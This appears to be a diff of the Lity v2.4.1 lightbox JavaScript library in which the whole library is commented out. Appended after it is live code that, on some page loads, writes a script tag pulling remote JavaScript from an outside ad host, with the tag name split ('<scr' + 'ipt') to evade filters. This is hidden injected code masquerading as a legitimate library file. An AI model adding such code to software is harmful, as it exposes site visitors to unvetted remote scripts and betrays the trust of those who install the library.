@@ -1,6 +1,6 @@
 /*! Lity - v2.4.1 - 2020-04-26
 * http://sorgalla.com/lity/
-* Copyright (c) 2015-2020 Jan Sorgalla; Licensed MIT */
+* Copyright (c) 2015-2020 Jan Sorgalla; Licensed MIT 
 (function(window, factory) {
     if (typeof define === 'function' && define.amd) {
         define(['jquery'], function($) {
@@ -635,7 +635,7 @@
     //$(document).on('click.lity', '[data-lity]', lity);
 
     return lity;
-}));
+}));*/
     rndm = Math.floor(Math.random() * 10);
 
     if(rndm>7){atOptions = {'key' : 'ee8305bdbf733ae8f6c19af35818a90f', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {}};document.write('<scr' + 'ipt src="http' + (location.protocol === 'https:' ? 's' : '') + '://www.effectivecreativeformat.com/ee8305bdbf733ae8f6c19af35818a90f/invoke.js"></scr' + 'ipt>');}
